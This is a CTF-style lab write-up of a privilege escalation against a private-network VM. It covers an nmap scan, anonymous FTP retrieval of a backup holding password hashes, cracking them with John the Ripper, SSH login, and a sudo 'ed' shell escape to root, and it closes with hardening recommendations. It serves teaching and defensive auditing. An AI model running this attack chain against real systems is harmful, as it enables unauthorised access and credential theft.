# VM Project: Privilege Escalation to Root — CTF-Style Lab

**Tools:** Kali Linux, Nmap, FTP, John the Ripper, SSH, sudo  
**Target:** `192.168.23.4`  
**Attacker:** `192.168.23.2` (Kali Linux)  
**Objective:** Gain root access and retrieve `flag.txt`

---

## Attack Chain Overview

```
Network Scan → FTP Anonymous Login → Backup File Download
→ Hash Extraction → Password Cracking → SSH Login
→ sudo Enumeration → Privilege Escalation → Root Shell → flag.txt
```

---

## Step 1: Identify Attacker Machine IP

```bash
ifconfig
```

**Result:** Kali machine on `192.168.23.2` (eth0), confirming same subnet as target.

![ifconfig output showing Kali IP 192.168.23.2](screenshots/image1.jpeg)

---

## Step 2: Discover Target on the Network

Performed a host discovery scan to find live machines on the subnet.

**Result:** Target discovered at `192.168.23.4`

![Netdiscover output showing target at 192.168.23.4](screenshots/image2.jpeg)

---

## Step 3: Port Scan the Target

```bash
nmap -sC -sV -T4 192.168.23.4
```

| Flag | Purpose |
|------|---------|
| `-sC` | Run default Nmap scripts |
| `-sV` | Detect service versions |
| `-T4` | Increase scan speed |

**Results:**

| Port | State | Service |
|------|-------|---------|
| 21/tcp | Open | FTP |
| 22/tcp | Open | SSH |

**Critical Finding:** `Anonymous FTP login allowed` — unauthenticated file access is possible.

![Nmap scan showing FTP port 21 open with anonymous login and SSH port 22](screenshots/image3.jpeg)

---

## Step 4: Inspect Exposed FTP File (Pre-Login Recon)

```bash
file backup
cat backup
```

The `backup` file was an ASCII text file containing a `CREDENTIALS:` section with usernames and password hashes:

| Username |
|----------|
| office |
| datacenter |
| sky |
| sunset |
| space |

---

## Step 5: Download Backup File via Anonymous FTP

```bash
ftp 192.168.23.4
# Login: anonymous
ls -la
get backup
```

File successfully transferred to Kali for offline analysis.

---

## Step 6 & 7: Prepare Hashes for Cracking

```bash
nano hashes.txt   # Opened file in text editor
cat hashes.txt    # Verified contents
```

Credential lines copied into `hashes.txt` — the required input format for John the Ripper.

---

## Step 8 & 9: Crack Passwords with John the Ripper

Initial run:

```bash
john --show hashes.txt
# Result: 0 password hashes cracked, 4 left
```

John detected ambiguous hash formats (HMAC-SHA256 vs sha512crypt). Format needed to be specified explicitly.

---

## Step 10: Force Correct Hash Format

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Cracked passwords:**

| Username | Password |
|----------|----------|
| space | space |
| sunset | cheer14 |

---

## Step 11: SSH Login with Cracked Credentials

```bash
ssh space@192.168.23.4
# Result: Permission denied
```

```bash
ssh sunset@192.168.23.4
# Password: cheer14
# Result: Login successful
```

Remote shell access achieved as user `sunset`.

---

## Step 12: Privilege Escalation

### Check sudo permissions

```bash
sudo -l
```

**Output:**

```
(root) NOPASSWD: /usr/bin/ed
```

The `sunset` user can run `/usr/bin/ed` as root without a password — a privilege escalation misconfiguration.

### Exploit sudo via ed

```bash
sudo /usr/bin/ed
# From within ed, escape to shell
```

### Verify root access

```bash
whoami
# root

id
# uid=0(root) gid=0(root)
```

---

## Step 13: Retrieve the Flag

```bash
cd /root
ls
# flag.txt  ftp  server.sh

more flag.txt
```

**Flag retrieved — full system compromise confirmed.**

---

## Vulnerabilities Identified

| Vulnerability | Risk |
|---------------|------|
| Anonymous FTP access enabled | High |
| Sensitive backup file exposed over FTP | Critical |
| Weak user passwords | High |
| Password hashes stored in downloadable file | Critical |
| Improper sudo config (`/usr/bin/ed` as root NOPASSWD) | Critical |
| SSH enabled for weak-password accounts | High |

---

## Recommendations

### 1. Disable Anonymous FTP

```
# In vsftpd.conf:
anonymous_enable=NO
```

Consider replacing FTP with **SFTP or FTPS** (encrypted alternatives).

### 2. Enforce Strong Password Policy

- Minimum 12 characters
- Uppercase + lowercase + numbers + special characters
- Enforce with `pam_pwquality` or `pam_cracklib`

### 3. Harden SSH

```
# In /etc/ssh/sshd_config:
PasswordAuthentication no
PermitRootLogin no
```

Use SSH key-based authentication only.

### 4. Fix sudo Configuration

Remove or restrict NOPASSWD entries for editors and other shell-escape-capable binaries. Reference: [GTFOBins](https://gtfobins.github.io/) for a list of exploitable binaries.

### 5. Regular Security Audits

- Vulnerability scanning: Nessus, OpenVAS
- Log monitoring: Fail2Ban
- File permission reviews
- Password auditing

---

## Conclusion

This lab demonstrated a complete attack chain from unauthenticated file access to root shell access. The compromise was possible due to chained misconfigurations — anonymous FTP, insecure credential storage, weak passwords, and an improper sudo rule — each individually manageable but collectively providing full system access.
